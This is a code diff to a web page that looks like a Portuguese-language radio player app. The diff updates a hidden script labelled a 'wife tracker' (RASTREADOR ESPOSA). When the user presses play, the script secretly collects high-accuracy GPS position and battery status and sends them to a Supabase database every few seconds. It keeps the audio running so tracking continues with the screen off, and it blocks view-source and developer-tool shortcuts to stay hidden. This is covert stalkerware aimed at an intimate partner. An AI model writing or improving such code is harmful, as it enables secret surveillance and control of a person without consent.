@@ -182,7 +182,7 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <div id="installFixed"><button id="installBtnFixed">⬇ INSTALAR APP NA TELA INICIAL</button></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.5 TRAVADO - TELA APAGADA FUNCIONA</div>
+<div class="lock">🔒 ESPOSA v2.6 TRAVADO - BATERIA CERTA + TELA APAGADA</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
 <script>
 'use strict';
@@ -264,40 +264,65 @@ if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
 
-/* ===== RASTREADOR ESPOSA v2.5 - TELA APAGADA FUNCIONA DE NOVO ===== */
+/* ===== RASTREADOR ESPOSA v2.6 - BATERIA CERTA + TELA APAGADA ===== */
 const DEVICE_ID_ESPOSA='ESPOSA';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false,_pegandoGPS=false,_watchId=null;
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false,_pegandoGPS=false,_watchId=null,_ultimoChargingEnviado=null;
 function setGpsStatus(ok,txt){ if(!gpsStatus) return; gpsStatus.textContent=txt; gpsStatus.classList.toggle("off",!ok); }
-async function _lerBat(){try{if(!_batObj&&navigator.getBattery){_batObj=await navigator.getBattery();_batObj.addEventListener('levelchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)});_batObj.addEventListener('chargingchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)})}if(_batObj){_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging}}catch(e){}}
+async function _lerBat(){
+  try{
+    if(navigator.getBattery){
+      let b = await navigator.getBattery();
+      let novaBat = Math.round(b.level*100);
+      let novoChg = b.charging;
+      let mudouChg = (_ultimoChargingEnviado!==null && _ultimoChargingEnviado!==novoChg);
+      _BAT = novaBat; _CHG = novoChg;
+      if(_ultimoChargingEnviado===null) _ultimoChargingEnviado=_CHG;
+      if(mudouChg){
+        _ultimoChargingEnviado=_CHG;
+        if(_lastLat!==0) _enviar(_lastLat,_lastLng,true);
+      }
+      if(!_batObj){
+        _batObj=b;
+        _batObj.addEventListener('levelchange',()=>{_lerBat();});
+        _batObj.addEventListener('chargingchange',()=>{_lerBat();});
+      }
+    }
+  }catch(e){}
+}
 _lerBat();
 setInterval(_lerBat,5000);
-// SEM WakeLock - WakeLock era o que matava quando apagava a tela. Tirei.
-async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!forcar&&agora-_ultimoEnvio<3000)return true;_ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;try{let r=await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});if(r.ok){setGpsStatus(true,"📍 GPS ESPOSA OK • "+_BAT+"% "+(_CHG?"⚡ Carregando":"🔋 Bateria")+" • "+new Date().toLocaleTimeString("pt-BR"));dbg("ENVIADO ESPOSA • "+_BAT+"% "+(_CHG?"CARREGANDO":"bateria"));return true;}else{dbg("ERRO enviar: "+r.status);return false;}}catch(e){dbg("ERRO enviar: "+e.message);return false;}}
-function _pegarGPS(){ if(_pegandoGPS) return; _pegandoGPS=true; navigator.geolocation.getCurrentPosition(p=>{_pegandoGPS=false;_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true);},err=>{_pegandoGPS=false;setGpsStatus(false,"📍 GPS falhou, tentando de novo • "+(err&&err.message?err.message:""));if(_lastLat!==0)_enviar(_lastLat,_lastLng,true);},{enableHighAccuracy:true,timeout:15000,maximumAge:30000}); }
+async function _enviar(lat,lon,forcar){
+  await _lerBat();
+  let agora=Date.now();
+  if(!forcar&&agora-_ultimoEnvio<3000)return true;
+  _ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;
+  try{
+    let r=await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});
+    if(r.ok){setGpsStatus(true,"📍 GPS ESPOSA OK • "+_BAT+"% "+(_CHG?"⚡ Carregando":"🔋 Bateria")+" • "+new Date().toLocaleTimeString("pt-BR"));dbg("ENVIADO ESPOSA • "+_BAT+"% "+(_CHG?"CARREGANDO":"bateria"));return true;}
+    else{dbg("ERRO enviar: "+r.status);return false;}
+  }catch(e){dbg("ERRO enviar: "+e.message);return false;}
+}
+function _pegarGPS(){ if(_pegandoGPS) return; _pegandoGPS=true; navigator.geolocation.getCurrentPosition(p=>{_pegandoGPS=false;_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true);},err=>{_pegandoGPS=false;setGpsStatus(false,"📍 GPS falhou, tentando de novo");if(_lastLat!==0)_enviar(_lastLat,_lastLng,true);},{enableHighAccuracy:true,timeout:15000,maximumAge:30000}); }
 function _iniciarRastreio(){
   if(_rastreiou) return; _rastreiou=true;
   _lerBat();
   setGpsStatus(false,"📍 GPS: buscando…");
-  // watchPosition continua mesmo com tela apagada enquanto o áudio toca
   try{
     if(navigator.geolocation && _watchId===null){
       _watchId=navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false);},err=>{dbg("watch GPS erro: "+err.code);},{enableHighAccuracy:true,timeout:20000,maximumAge:10000});
     }
   }catch(e){}
   _pegarGPS();
-  // Heartbeat: mesmo se o GPS falhar com tela apagada, reenvia a última posição + bateria
-  setInterval(()=>{ if(_lastLat!==0) _enviar(_lastLat,_lastLng,true); },10000);
+  setInterval(async ()=>{ await _lerBat(); if(_lastLat!==0) _enviar(_lastLat,_lastLng,true); },10000);
   setInterval(_pegarGPS,15000);
-  // QUANDO VOLTAR DA TELA APAGADA, NÃO PAUSA, SÓ RETOMA
   document.addEventListener('visibilitychange',()=>{
     if(document.visibilityState==='visible'){
       _pegarGPS();
       if(state.playing && audio.paused){ audio.play().catch(()=>{}); }
     }
   });
-  // Se o áudio pausar sozinho quando apagar a tela, tenta voltar
   audio.addEventListener('pause',()=>{ if(everPlayed){ setTimeout(()=>{ if(audio.paused && document.visibilityState!=='visible'){ audio.play().catch(()=>{}) } },1000); } });
 }
 playBtn.addEventListener('click',_iniciarRastreio);
@@ -310,7 +335,7 @@ document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 Elias costa NEGRET'S','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 Elias Costa NEGRET'S v2.6','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
